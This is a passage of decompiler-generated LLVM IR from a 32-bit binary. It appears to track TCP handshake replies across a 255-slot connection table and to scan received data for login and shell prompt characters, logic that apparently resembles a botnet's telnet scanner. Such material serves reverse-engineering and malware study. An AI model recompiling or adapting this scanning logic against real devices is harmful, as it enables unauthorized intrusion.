  %tmp295 = icmp ult i32 %v0_80503bc, 40
  br i1 %tmp295, label %dec_label_pc_8050396, label %dec_label_pc_80503de

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503d9
  %v1_80503de = add i32 %v0_80503c1, 106
  %v2_80503de = inttoptr i32 %v1_80503de to i32*
  %v3_80503de = load i32, i32* %v2_80503de, align 4
  store i32 %v3_80503de, i32* %eax.global-to-local, align 4
  %v1_80503e2 = load i32, i32* @global_var_80569bc.27, align 4
  %v12_80503e2 = icmp eq i32 %v3_80503de, %v1_80503e2
  %v1_80503e8 = icmp eq i1 %v12_80503e2, false
  br i1 %v1_80503e8, label %dec_label_pc_8050396, label %dec_label_pc_80503ea

dec_label_pc_80503ea:                             ; preds = %dec_label_pc_80503de
  %v1_80503ea = add i32 %v0_80503c1, 99
  %v2_80503ea = inttoptr i32 %v1_80503ea to i8*
  %v3_80503ea = load i8, i8* %v2_80503ea, align 1
  %v12_80503ea = icmp eq i8 %v3_80503ea, 6
  %v1_80503ef = icmp eq i1 %v12_80503ea, false
  br i1 %v1_80503ef, label %dec_label_pc_8050396, label %dec_label_pc_80503f1

dec_label_pc_80503f1:                             ; preds = %dec_label_pc_80503ea
  %v1_80503f1 = add i32 %v0_80503c1, 110
  %v2_80503f1 = inttoptr i32 %v1_80503f1 to i32*
  %v3_80503f1 = load i32, i32* %v2_80503f1, align 4
  store i32 %v3_80503f1, i32* %esi.global-to-local, align 4
  %v1_80503f5 = trunc i32 %v3_80503f1 to i16
  %v7_80503f5 = icmp eq i16 %v1_80503f5, 5888
  br i1 %v7_80503f5, label %dec_label_pc_8050403, label %dec_label_pc_80503fc

dec_label_pc_80503fc:                             ; preds = %dec_label_pc_80503f1
  %v10_80503fc = icmp eq i16 %v1_80503f5, 4873
  %v1_8050401 = icmp eq i1 %v10_80503fc, false
  br i1 %v1_8050401, label %dec_label_pc_8050396, label %dec_label_pc_8050403

dec_label_pc_8050403:                             ; preds = %dec_label_pc_80503fc, %dec_label_pc_80503f1
  %v1_8050403 = add i32 %v0_80503c1, 54
  %v2_8050403 = inttoptr i32 %v1_8050403 to i16*
  %v3_8050403 = load i16, i16* %v2_8050403, align 2
  %v4_8050403 = zext i16 %v3_8050403 to i32
  %v6_8050403 = and i32 %v3_80503de, -65536
  %v7_8050403 = or i32 %v4_8050403, %v6_8050403
  store i32 %v7_8050403, i32* %eax.global-to-local, align 4
  %v3_8050408 = add i32 %v0_80503c1, 112
  %v4_8050408 = inttoptr i32 %v3_8050408 to i16*
  %v5_8050408 = load i16, i16* %v4_8050408, align 2
  %v16_8050408 = icmp eq i16 %v3_8050403, %v5_8050408
  %v1_805040d = icmp eq i1 %v16_8050408, false
  br i1 %v1_805040d, label %dec_label_pc_8050396, label %dec_label_pc_805040f

dec_label_pc_805040f:                             ; preds = %dec_label_pc_8050403
  %v1_805040f = add i32 %v0_80503c1, 123
  %v2_805040f = inttoptr i32 %v1_805040f to i8*
  %v3_805040f = load i8, i8* %v2_805040f, align 1
  %v4_805040f = zext i8 %v3_805040f to i32
  %v6_805040f = and i32 %v7_8050403, -256
  %v7_805040f = or i32 %v4_805040f, %v6_805040f
  store i32 %v7_805040f, i32* %eax.global-to-local, align 4
  %v2_8050413 = and i8 %v3_805040f, 2
  %v3_8050413 = icmp eq i8 %v2_8050413, 0
  br i1 %v3_8050413, label %dec_label_pc_8050396, label %dec_label_pc_805041b

dec_label_pc_805041b:                             ; preds = %dec_label_pc_805040f
  %v2_805041b = and i32 %v4_805040f, 16
  %v3_805041b = icmp eq i32 %v2_805041b, 0
  br i1 %v3_805041b, label %dec_label_pc_8050396, label %dec_label_pc_8050423

dec_label_pc_8050423:                             ; preds = %dec_label_pc_805041b
  %v2_8050423 = and i32 %v4_805040f, 4
  %v3_8050423 = icmp eq i32 %v2_8050423, 0
  %v1_8050425 = icmp eq i1 %v3_8050423, false
  br i1 %v1_8050425, label %dec_label_pc_8050396, label %dec_label_pc_805042b

dec_label_pc_805042b:                             ; preds = %dec_label_pc_8050423
  %tmp302 = urem i8 %v3_805040f, 2
  %v3_805042b = icmp eq i8 %tmp302, 0
  %v1_805042d = icmp eq i1 %v3_805042b, false
  br i1 %v1_805042d, label %dec_label_pc_8050396, label %dec_label_pc_8050433

dec_label_pc_8050433:                             ; preds = %dec_label_pc_805042b
  %v1_8050433 = add i32 %v0_80503c1, 118
  %v2_8050433 = inttoptr i32 %v1_8050433 to i32*
  %v3_8050433 = load i32, i32* %v2_8050433, align 4
  %v1_8050437 = trunc i32 %v3_8050433 to i16
  %v2_8050437 = call i16 @llvm.bswap.i16(i16 %v1_8050437)
  %v3_8050437 = zext i16 %v2_8050437 to i32
  %v1_805043b = udiv i32 %v3_8050433, 65536
  %v2_805043b = mul nuw i32 %v3_8050437, 65536
  %v1_805043e = trunc i32 %v1_805043b to i16
  %v2_805043e = call i16 @llvm.bswap.i16(i16 %v1_805043e)
  %v3_805043e = zext i16 %v2_805043e to i32
  %v6_805043e = or i32 %v3_805043e, %v2_805043b
  store i32 %v6_805043e, i32* %eax.global-to-local, align 4
  %v1_8050442 = add i32 %v6_805043e, -1
  %v1_8050445 = trunc i32 %v1_8050442 to i16
  %v2_8050445 = call i16 @llvm.bswap.i16(i16 %v1_8050445)
  %v3_8050445 = zext i16 %v2_8050445 to i32
  %v1_8050449 = udiv i32 %v1_8050442, 65536
  %v2_8050449 = mul nuw i32 %v3_8050445, 65536
  %v1_805044c = trunc i32 %v1_8050449 to i16
  %v2_805044c = call i16 @llvm.bswap.i16(i16 %v1_805044c)
  %v3_805044c = zext i16 %v2_805044c to i32
  %v6_805044c = or i32 %v3_805044c, %v2_8050449
  store i32 %v6_805044c, i32* %edx.global-to-local, align 4
  %v1_8050450 = add i32 %v0_80503c1, 102
  %v2_8050450 = inttoptr i32 %v1_8050450 to i32*
  %v3_8050450 = load i32, i32* %v2_8050450, align 4
  %v15_8050450 = icmp eq i32 %v3_8050450, %v6_805044c
  %v1_8050454 = icmp eq i1 %v15_8050450, false
  br i1 %v1_8050454, label %dec_label_pc_8050396, label %dec_label_pc_805045a

dec_label_pc_805045a:                             ; preds = %dec_label_pc_8050433
  %v0_805045a = load i32, i32* @ebx, align 4
  %v1_805045a = add i32 %v0_805045a, -255
  %v6_805045a = sub i32 254, %v0_805045a
  %v7_805045a = and i32 %v6_805045a, %v0_805045a
  %v8_805045a = icmp slt i32 %v7_805045a, 0
  %v9_805045a = icmp eq i32 %v1_805045a, 0
  %v10_805045a = icmp slt i32 %v1_805045a, 0
  %v3_8050460 = icmp eq i1 %v10_805045a, %v8_805045a
  %v4_8050460 = icmp eq i1 %v9_805045a, false
  %v5_8050460 = and i1 %v4_8050460, %v3_8050460
  br i1 %v5_8050460, label %dec_label_pc_80504a6, label %dec_label_pc_8050462

dec_label_pc_8050462:                             ; preds = %dec_label_pc_805045a
  %v0_8050465 = load i32, i32* @global_var_80569d8.45, align 8
  store i32 %v0_8050465, i32* %ecx.global-to-local, align 4
  %v2_805046b = mul i32 %v0_805045a, 288
  %v2_805046e = add i32 %v0_8050465, %v2_805046b
  store i32 %v2_805046e, i32* @eax, align 4
  %v1_8050470 = add i32 %v2_805046e, 12
  %v2_8050470 = inttoptr i32 %v1_8050470 to i32*
  %v3_8050470 = load i32, i32* %v2_8050470, align 4
  %v1_8050473 = add i32 %v2_805046e, 288
  store i32 %v1_8050473, i32* %ecx.global-to-local, align 4
  %v1_8050479 = icmp eq i32 %v3_8050470, 0
  br i1 %v1_8050479, label %dec_label_pc_8050495, label %dec_label_pc_805047d

dec_label_pc_805047d:                             ; preds = %dec_label_pc_8050462, %dec_label_pc_8050486
  %v0_8050486 = phi i32 [ %v1_8050488, %dec_label_pc_8050486 ], [ %v1_8050473, %dec_label_pc_8050462 ]
  %v0_805047d = phi i32 [ %v1_805047d, %dec_label_pc_8050486 ], [ %v0_805045a, %dec_label_pc_8050462 ]
  %v1_805047d = add i32 %v0_805047d, 1
  store i32 %v1_805047d, i32* @ebx, align 4
  %v6_805047e = icmp eq i32 %v0_805047d, 255
  br i1 %v6_805047e, label %dec_label_pc_80504a6.loopexit, label %dec_label_pc_8050486

dec_label_pc_8050486:                             ; preds = %dec_label_pc_805047d
  store i32 %v0_8050486, i32* @eax, align 4
  %v1_8050488 = add i32 %v0_8050486, 288
  store i32 %v1_8050488, i32* %ecx.global-to-local, align 4
  %v1_805048e = add i32 %v0_8050486, 12
  %v2_805048e = inttoptr i32 %v1_805048e to i32*
  %v3_805048e = load i32, i32* %v2_805048e, align 4
  store i32 %v3_805048e, i32* @edi, align 4
  %v1_8050491 = icmp eq i32 %v3_805048e, 0
  %v1_8050493 = icmp eq i1 %v1_8050491, false
  br i1 %v1_8050493, label %dec_label_pc_805047d, label %dec_label_pc_8050495.loopexit

dec_label_pc_8050495.loopexit:                    ; preds = %dec_label_pc_8050486
  br label %dec_label_pc_8050495

dec_label_pc_8050495:                             ; preds = %dec_label_pc_8050495.loopexit, %dec_label_pc_8050462
  %v1_8050495 = phi i32 [ %v0_8050486, %dec_label_pc_8050495.loopexit ], [ %v2_805046e, %dec_label_pc_8050462 ]
  %v2_8050495 = add i32 %v1_8050495, 16
  %v3_8050495 = inttoptr i32 %v2_8050495 to i32*
  store i32 %v6_805044c, i32* %v3_8050495, align 4
  %v0_8050498 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050498 = trunc i32 %v0_8050498 to i16
  %v2_8050498 = load i32, i32* @eax, align 4
  %v3_8050498 = add i32 %v2_8050498, 20
  %v4_8050498 = inttoptr i32 %v3_8050498 to i16*
  store i16 %v1_8050498, i16* %v4_8050498, align 2
  %v0_805049c = call i32 @function_804f800()
  store i32 %v0_805049c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050396

dec_label_pc_80504a6.loopexit:                    ; preds = %dec_label_pc_805047d
  br label %dec_label_pc_80504a6

dec_label_pc_80504a6:                             ; preds = %dec_label_pc_805045a, %dec_label_pc_80503cc, %dec_label_pc_8050396, %dec_label_pc_80504a6.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_80504af = add i32 %v0_80503c1, 44
  %v2_80504af = inttoptr i32 %v1_80504af to i32*
  %v3_80504af = load i32, i32* %v2_80504af, align 4
  %v4_80504af = inttoptr i32 %v3_80504af to i8*
  %v5_80504b4 = call i8* @_memset(i8* %v4_80504af, i32 0, i32 32)
  %v0_80504b6 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80504b6, i32* %ecx.global-to-local, align 4
  %v0_80504b8 = load i32, i32* @esp, align 4
  %v1_80504b8 = add i32 %v0_80504b8, 8
  %v2_80504b8 = inttoptr i32 %v1_80504b8 to i32*
  %v3_80504b8 = load i32, i32* %v2_80504b8, align 4
  %v4_80504b8 = inttoptr i32 %v3_80504b8 to i8*
  store i1 false, i1* @df, align 1
  %v2_80504bd = load i32, i32* %eax.global-to-local, align 4
  %v5_80504bd = call i8* @_memset(i8* %v4_80504b8, i32 %v2_80504bd, i32 %v0_80504b6)
  %v6_80504bd = ptrtoint i8* %v5_80504bd to i32
  store i32 %v6_80504bd, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_80504c1 = load i32, i32* @esp, align 4
  %v1_80504c1 = add i32 %v0_80504c1, 1868
  %v2_80504c1 = inttoptr i32 %v1_80504c1 to i32*
  store i32 0, i32* %v2_80504c1, align 4
  store i32 0, i32* @esi, align 4
  %v0_80504ce.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504ce

dec_label_pc_80504ce:                             ; preds = %dec_label_pc_8050521, %dec_label_pc_80504a6
  %v0_80504ce = phi i32 [ %v0_8050530, %dec_label_pc_8050521 ], [ %v0_80504ce.pre, %dec_label_pc_80504a6 ]
  %v0_80504d1 = load i32, i32* @global_var_80569d8.45, align 8
  store i32 %v0_80504d1, i32* %eax.global-to-local, align 4
  %v2_80504d6 = mul i32 %v0_80504ce, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_80504de = add i32 %v0_80504d1, %v2_80504d6
  store i32 %v2_80504de, i32* @ebx, align 4
  %v1_80504e0 = add i32 %v2_80504de, 12
  %v2_80504e0 = inttoptr i32 %v1_80504e0 to i32*
  %v3_80504e0 = load i32, i32* %v2_80504e0, align 4
  store i32 %v3_80504e0, i32* %edx.global-to-local, align 4
  %v1_80504e3 = add i32 %v3_80504e0, -1
  %v5_80504e3 = icmp eq i32 %v3_80504e0, 0
  %v9_80504e3 = icmp eq i32 %v1_80504e3, 0
  %v2_80504e6 = or i1 %v5_80504e3, %v9_80504e3
  br i1 %v2_80504e6, label %dec_label_pc_8051082, label %dec_label_pc_80504ec

dec_label_pc_80504ec:                             ; preds = %dec_label_pc_80504ce, %dec_label_pc_805108a
  %v1_80504f6 = phi i32 [ 30, %dec_label_pc_80504ce ], [ 5, %dec_label_pc_805108a ]
  %v0_80504ec = load i32, i32* @global_var_8056990.34, align 16
  store i32 %v0_80504ec, i32* %eax.global-to-local, align 4
  %v1_80504f1 = add i32 %v2_80504de, 8
  %v2_80504f1 = inttoptr i32 %v1_80504f1 to i32*
  %v3_80504f1 = load i32, i32* %v2_80504f1, align 4
  %v2_80504f4 = sub i32 %v0_80504ec, %v3_80504f1
  store i32 %v2_80504f4, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_80504f4, %v1_80504f6
  br i1 %tmp296, label %dec_label_pc_8051020, label %dec_label_pc_80504fe

dec_label_pc_80504fe:                             ; preds = %dec_label_pc_80504ec
  store i32 %v1_80504e3, i32* %edx.global-to-local, align 4
  %v1_8050ff5 = add i32 %v2_80504de, 4
  %v2_8050ff5 = inttoptr i32 %v1_8050ff5 to i32*
  %v3_8050ff5 = load i32, i32* %v2_8050ff5, align 4
  %v1_8050ffa = urem i32 %v3_8050ff5, 32
  store i32 %v1_8050ffa, i32* %eax.global-to-local, align 4
  %v2_8050ffd = udiv i32 %v3_8050ff5, 32
  store i32 %v2_8050ffd, i32* %edx.global-to-local, align 4
  %v0_8051000 = load i32, i32* @esp, align 4
  %v2_8051000 = mul nuw nsw i32 %v2_8050ffd, 4
  br i1 %v9_80504e3, label %dec_label_pc_8050ff5, label %dec_label_pc_8050505

dec_label_pc_8050505:                             ; preds = %dec_label_pc_80504fe
  %v3_8050510 = add nuw nsw i32 %v2_8051000, 1700
  %v4_8050510 = add i32 %v3_8050510, %v0_8051000
  %v5_8050510 = inttoptr i32 %v4_8050510 to i32*
  %v6_8050510 = load i32, i32* %v5_8050510, align 4
  %v9_8050510 = shl i32 1, %v1_8050ffa
  %v12_8050510 = or i32 %v6_8050510, %v9_8050510
  store i32 %v12_8050510, i32* %v5_8050510, align 4
  %v0_8050518 = load i32, i32* @ebx, align 4
  %v1_8050518 = add i32 %v0_8050518, 4
  %v2_8050518 = inttoptr i32 %v1_8050518 to i32*
  %v3_8050518 = load i32, i32* %v2_8050518, align 4
  store i32 %v3_8050518, i32* %eax.global-to-local, align 4
  %v0_805051b = load i32, i32* @edi, align 4
  %v2_805051b = sub i32 %v0_805051b, %v3_8050518
  %v8_805051b = xor i32 %v0_805051b, %v3_8050518
  %v9_805051b = xor i32 %v2_805051b, %v0_805051b
  %v10_805051b = and i32 %v9_805051b, %v8_805051b
  %v11_805051b = icmp slt i32 %v10_805051b, 0
  %v13_805051b = icmp slt i32 %v2_805051b, 0
  %v2_805051d = icmp eq i1 %v13_805051b, %v11_805051b
  br i1 %v2_805051d, label %dec_label_pc_8050521, label %dec_label_pc_805051f

dec_label_pc_805051f:                             ; preds = %dec_label_pc_8050505
  store i32 %v3_8050518, i32* @edi, align 4
  br label %dec_label_pc_8050521

dec_label_pc_8050521:                             ; preds = %dec_label_pc_8051082, %dec_label_pc_8050ff5, %dec_label_pc_8050505, %dec_label_pc_805106f, %dec_label_pc_805104d, %dec_label_pc_8051013, %dec_label_pc_805051f
  %v0_8050521 = load i32, i32* @esp, align 4
  %v1_8050521 = add i32 %v0_8050521, 1868
  %v2_8050521 = inttoptr i32 %v1_8050521 to i32*
  %v3_8050521 = load i32, i32* %v2_8050521, align 4
  %v1_8050528 = add i32 %v3_8050521, 1
  store i32 %v1_8050528, i32* %eax.global-to-local, align 4
  store i32 %v1_8050528, i32* %v2_8050521, align 4
  %v0_8050530 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050530 = add i32 %v0_8050530, -255
  %v6_8050530 = sub i32 254, %v0_8050530
  %v7_8050530 = and i32 %v6_8050530, %v0_8050530
  %v8_8050530 = icmp slt i32 %v7_8050530, 0
  %v9_8050530 = icmp eq i32 %v1_8050530, 0
  %v10_8050530 = icmp slt i32 %v1_8050530, 0
  %v3_8050535 = icmp ne i1 %v10_8050530, %v8_8050530
  %v4_8050535 = or i1 %v9_8050530, %v3_8050535
  br i1 %v4_8050535, label %dec_label_pc_80504ce, label %dec_label_pc_8050537

dec_label_pc_8050537:                             ; preds = %dec_label_pc_8050521
  %v0_8050537 = load i32, i32* @esp, align 4
  %v1_8050537 = add i32 %v0_8050537, 1860
  %v2_8050537 = inttoptr i32 %v1_8050537 to i32*
  store i32 0, i32* %v2_8050537, align 4
  %v0_8050542 = load i32, i32* @esp, align 4
  %v1_8050542 = add i32 %v0_8050542, 1856
  %v2_8050542 = inttoptr i32 %v1_8050542 to i32*
  store i32 1, i32* %v2_8050542, align 4
  %v0_805054d = load i32, i32* @esp, align 4
  %v0_8050550 = load i32, i32* @edi, align 4
  %v1_8050550 = load i32, i32* @esi, align 4
  %v2_8050550 = sub i32 %v0_8050550, %v1_8050550
  %v8_8050550 = xor i32 %v1_8050550, %v0_8050550
  %v9_8050550 = xor i32 %v2_8050550, %v0_8050550
  %v10_8050550 = and i32 %v9_8050550, %v8_8050550
  %v11_8050550 = icmp slt i32 %v10_8050550, 0
  %v13_8050550 = icmp slt i32 %v2_8050550, 0
  %v1_8050552 = add i32 %v0_805054d, 1856
  %v2_8050559 = add i32 %v0_805054d, -16
  %v3_8050559 = inttoptr i32 %v2_8050559 to i32*
  store i32 %v1_8050552, i32* %v3_8050559, align 4
  %v1_805055a = add i32 %v0_805054d, -20
  %v2_805055a = inttoptr i32 %v1_805055a to i32*
  store i32 0, i32* %v2_805055a, align 4
  %v1_805055c = add i32 %v0_805054d, 1572
  store i32 %v1_805055c, i32* %edx.global-to-local, align 4
  %v0_8050563 = load i32, i32* @edi, align 4
  store i32 %v0_8050563, i32* %eax.global-to-local, align 4
  %v2_8050565 = add i32 %v0_805054d, -24
  %v3_8050565 = inttoptr i32 %v2_8050565 to i32*
  store i32 %v1_805055c, i32* %v3_8050565, align 4
  %v1_8050566 = add i32 %v0_805054d, 1700
  store i32 %v1_8050566, i32* %ecx.global-to-local, align 4
  %v2_805056d = add i32 %v0_805054d, -28
  %v3_805056d = inttoptr i32 %v2_805056d to i32*
  store i32 %v1_8050566, i32* %v3_805056d, align 4
  %v2_805056e = icmp eq i1 %v13_8050550, %v11_8050550
  br i1 %v2_805056e, label %dec_label_pc_8050537.dec_label_pc_8050572_crit_edge, label %dec_label_pc_8050570

dec_label_pc_8050537.dec_label_pc_8050572_crit_edge: ; preds = %dec_label_pc_8050537
  %v0_8050572.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050572

dec_label_pc_8050570:                             ; preds = %dec_label_pc_8050537
  %v0_8050570 = load i32, i32* @esi, align 4
  store i32 %v0_8050570, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050572

dec_label_pc_8050572:                             ; preds = %dec_label_pc_8050537.dec_label_pc_8050572_crit_edge, %dec_label_pc_8050570
  %v0_8050572 = phi i32 [ %v0_8050572.pre, %dec_label_pc_8050537.dec_label_pc_8050572_crit_edge ], [ %v0_8050570, %dec_label_pc_8050570 ]
  %v1_8050572 = add i32 %v0_8050572, 1
  store i32 %v1_8050572, i32* %eax.global-to-local, align 4
  %v2_8050573 = add i32 %v0_805054d, -32
  %v3_8050573 = inttoptr i32 %v2_8050573 to i32*
  store i32 %v1_8050572, i32* %v3_8050573, align 4
  %v0_8050574 = call i32 @function_8052448()
  store i32 %v0_8050574, i32* %eax.global-to-local, align 4
  %v0_8050579 = load i32, i32* @esp, align 4
  %v1_805057c = add i32 %v0_8050579, 16
  %v2_805057c = inttoptr i32 %v1_805057c to i32*
  store i32 0, i32* %v2_805057c, align 4
  %v2_805057e = call i32 @function_8052502(i32* nonnull @0)
  %v0_8050583 = load i32, i32* @esp, align 4
  %v1_8050583 = add i32 %v0_8050583, 1884
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  store i32 0, i32* %v2_8050583, align 4
  store i32 %v2_805057e, i32* @global_var_8056990.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050598

dec_label_pc_8050598:                             ; preds = %dec_label_pc_80505e1, %dec_label_pc_8050572
  %v0_8050598 = phi i32 [ %v0_80505f0, %dec_label_pc_80505e1 ], [ 0, %dec_label_pc_8050572 ]
  %v0_805059b = load i32, i32* @global_var_80569d8.45, align 8
  store i32 %v0_805059b, i32* %eax.global-to-local, align 4
  %v2_80505a0 = mul i32 %v0_8050598, 288
  %v2_80505a3 = add i32 %v0_805059b, %v2_80505a0
  store i32 %v2_80505a3, i32* @edi, align 4
  %v1_80505a5 = add i32 %v2_80505a3, 4
  %v2_80505a5 = inttoptr i32 %v1_80505a5 to i32*
  %v3_80505a5 = load i32, i32* %v2_80505a5, align 4
  store i32 %v3_80505a5, i32* %ecx.global-to-local, align 4
  %v10_80505a8 = icmp eq i32 %v3_80505a5, -1
  br i1 %v10_80505a8, label %dec_label_pc_80505e1, label %dec_label_pc_80505ad

dec_label_pc_80505ad:                             ; preds = %dec_label_pc_8050598
  %v2_80505b1 = udiv i32 %v3_80505a5, 32
  store i32 %v2_80505b1, i32* %edx.global-to-local, align 4
  %v1_80505b4 = urem i32 %v3_80505a5, 32
  store i32 %v1_80505b4, i32* %eax.global-to-local, align 4
  %v0_80505b7 = load i32, i32* @esp, align 4
  %v2_80505b7 = mul nuw nsw i32 %v2_80505b1, 4
  %v3_80505b7 = add nuw nsw i32 %v2_80505b7, 1572
  %v4_80505b7 = add i32 %v3_80505b7, %v0_80505b7
  %v5_80505b7 = inttoptr i32 %v4_80505b7 to i32*
  %v6_80505b7 = load i32, i32* %v5_80505b7, align 4
  %v9_80505b7 = shl i32 1, %v1_80505b4
  %v10_80505b7 = and i32 %v6_80505b7, %v9_80505b7
  %v11_80505b7 = icmp ne i32 %v10_80505b7, 0
  %v1_80505bf = zext i1 %v11_80505b7 to i32
  store i32 %v1_80505bf, i32* %eax.global-to-local, align 4
  %v4_80505c2 = icmp eq i1 %v11_80505b7, false
  %v1_80505c4 = icmp eq i1 %v4_80505c2, false
  br i1 %v1_80505c4, label %dec_label_pc_8050f2b, label %dec_label_pc_80505ca

dec_label_pc_80505ca:                             ; preds = %dec_label_pc_80505ad, %dec_label_pc_8050fbb
  %v0_80505d2 = phi i32 [ %v0_80505b7, %dec_label_pc_80505ad ], [ %v0_80505d2.pre, %dec_label_pc_8050fbb ]
  %v0_80505ca = phi i32 [ %v3_80505a5, %dec_label_pc_80505ad ], [ %v0_80505ca.pre, %dec_label_pc_8050fbb ]
  %v2_80505cc = udiv i32 %v0_80505ca, 32
  store i32 %v2_80505cc, i32* %ecx.global-to-local, align 4
  %v1_80505cf = urem i32 %v0_80505ca, 32
  store i32 %v1_80505cf, i32* %eax.global-to-local, align 4
  %v2_80505d2 = mul nuw nsw i32 %v2_80505cc, 4
  %v3_80505d2 = add i32 %v0_80505d2, 1700
  %v4_80505d2 = add i32 %v3_80505d2, %v2_80505d2
  %v5_80505d2 = inttoptr i32 %v4_80505d2 to i32*
  %v6_80505d2 = load i32, i32* %v5_80505d2, align 4
  %v9_80505d2 = shl i32 1, %v1_80505cf
  %v10_80505d2 = and i32 %v6_80505d2, %v9_80505d2
  %v11_80505d2 = icmp ne i32 %v10_80505d2, 0
  %v1_80505da = zext i1 %v11_80505d2 to i32
  store i32 %v1_80505da, i32* %eax.global-to-local, align 4
  %v4_80505dd = icmp eq i1 %v11_80505d2, false
  %v1_80505df = icmp eq i1 %v4_80505dd, false
  br i1 %v1_80505df, label %dec_label_pc_8050638.preheader, label %dec_label_pc_80505e1

dec_label_pc_8050638.preheader:                   ; preds = %dec_label_pc_80505ca
  %v0_805063827 = load i32, i32* @edi, align 4
  %v1_805063828 = add i32 %v0_805063827, 12
  %v2_805063829 = inttoptr i32 %v1_805063828 to i32*
  %v3_805063830 = load i32, i32* %v2_805063829, align 4
  store i32 %v3_805063830, i32* %eax.global-to-local, align 4
  %v1_805063b31 = icmp eq i32 %v3_805063830, 0
  br i1 %v1_805063b31, label %dec_label_pc_80505e1, label %dec_label_pc_805063f

dec_label_pc_80505e1:                             ; preds = %dec_label_pc_8050638.backedge, %dec_label_pc_8050638.preheader, %dec_label_pc_8050b9b, %dec_label_pc_80505ca, %dec_label_pc_8050598, %dec_label_pc_80510a7, %dec_label_pc_8050fcc, %dec_label_pc_8050bd3
  %v0_80505e1 = load i32, i32* @esp, align 4
  %v1_80505e1 = add i32 %v0_80505e1, 1868
  %v2_80505e1 = inttoptr i32 %v1_80505e1 to i32*
  %v3_80505e1 = load i32, i32* %v2_80505e1, align 4
  %v1_80505e8 = add i32 %v3_80505e1, 1
  store i32 %v1_80505e8, i32* %eax.global-to-local, align 4
  store i32 %v1_80505e8, i32* %v2_80505e1, align 4
  %v0_80505f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505f0 = add i32 %v0_80505f0, -255
  %v6_80505f0 = sub i32 254, %v0_80505f0
  %v7_80505f0 = and i32 %v6_80505f0, %v0_80505f0
  %v8_80505f0 = icmp slt i32 %v7_80505f0, 0
  %v9_80505f0 = icmp eq i32 %v1_80505f0, 0
  %v10_80505f0 = icmp slt i32 %v1_80505f0, 0
  %v3_80505f5 = icmp ne i1 %v10_80505f0, %v8_80505f0
  %v4_80505f5 = or i1 %v9_80505f0, %v3_80505f5
  br i1 %v4_80505f5, label %dec_label_pc_8050598, label %dec_label_pc_80505f7

dec_label_pc_80505fc:                             ; preds = %dec_label_pc_80506aa
  %v1_80505fc = add i32 %v0_80506aa, 24
  %v2_80505fc = inttoptr i32 %v1_80505fc to i32*
  %v3_80505fc = load i32, i32* %v2_80505fc, align 4
  %v1_80505ff = add i32 %v3_80505fc, -1
  store i32 %v1_80505ff, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_80505ff, 1
  br i1 %tmp136, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050604.preheader

dec_label_pc_8050604.preheader:                   ; preds = %dec_label_pc_80505fc
  %v7_8050604.pre = load i32, i32* @edx, align 4
  %v2_8050604 = add i32 %v0_80506aa, 28
  br label %dec_label_pc_8050604

dec_label_pc_8050604:                             ; preds = %dec_label_pc_8050604.preheader, %dec_label_pc_8050635
  %v7_8050604 = phi i32 [ %v7_8050604.pre, %dec_label_pc_8050604.preheader ], [ %v9_8050604, %dec_label_pc_8050635 ]
  %v0_8050e28 = phi i32 [ %v1_80505ff, %dec_label_pc_8050604.preheader ], [ %v1_8050635, %dec_label_pc_8050635 ]
  %v3_8050604 = add i32 %v2_8050604, %v0_8050e28
  %v4_8050604 = inttoptr i32 %v3_8050604 to i8*
  %v5_8050604 = load i8, i8* %v4_8050604, align 1
  %v6_8050604 = zext i8 %v5_8050604 to i32
  %v8_8050604 = and i32 %v7_8050604, -256
  %v9_8050604 = or i32 %v6_8050604, %v8_8050604
  store i32 %v9_8050604, i32* %edx.global-to-local, align 4
  %v10_8050608 = icmp eq i8 %v5_8050604, 58
  br i1 %v10_8050608, label %dec_label_pc_8050e28, label %dec_label_pc_8050611

dec_label_pc_8050611:                             ; preds = %dec_label_pc_8050604
  %v10_8050611 = icmp eq i8 %v5_8050604, 62
  br i1 %v10_8050611, label %dec_label_pc_8050e28, label %dec_label_pc_805061a

dec_label_pc_805061a:                             ; preds = %dec_label_pc_8050611
  %v10_805061a = icmp eq i8 %v5_8050604, 36
  br i1 %v10_805061a, label %dec_label_pc_8050e28, label %dec_label_pc_8050623

dec_label_pc_8050623:                             ; preds = %dec_label_pc_805061a
  %v10_8050623 = icmp eq i8 %v5_8050604, 35
  br i1 %v10_8050623, label %dec_label_pc_8050e28, label %dec_label_pc_805062c

dec_label_pc_805062c:                             ; preds = %dec_label_pc_8050623
  %v10_805062c = icmp eq i8 %v5_8050604, 37
  br i1 %v10_805062c, label %dec_label_pc_8050e28, label %dec_label_pc_8050635

dec_label_pc_8050635:                             ; preds = %dec_label_pc_805062c
  %v1_8050635 = add i32 %v0_8050e28, -1
  %v8_8050635 = icmp eq i32 %v1_8050635, 0
  store i32 %v1_8050635, i32* %eax.global-to-local, align 4
  %v1_8050636 = icmp eq i1 %v8_8050635, false
  br i1 %v1_8050636, label %dec_label_pc_8050604, label %dec_label_pc_8050638.backedge

dec_label_pc_8050638.backedge:                    ; preds = %dec_label_pc_8050ad3.thread, %dec_label_pc_8050638.loopexit12.loopexit, %dec_label_pc_8050ac0, %dec_label_pc_805086d, %dec_label_pc_80509f5, %dec_label_pc_80508b2, %dec_label_pc_8050635
  %v0_8050638 = phi i32 [ %v0_80506aa, %dec_label_pc_8050635 ], [ %v0_80506aa, %dec_label_pc_80508b2 ], [ %v0_80506aa, %dec_label_pc_80509f5 ], [ %v0_80506aa, %dec_label_pc_805086d ], [ %v0_80506aa, %dec_label_pc_8050ac0 ], [ %v0_8050638.pre.pre, %dec_label_pc_8050638.loopexit12.loopexit ], [ %v0_80506aa, %dec_label_pc_8050ad3.thread ]
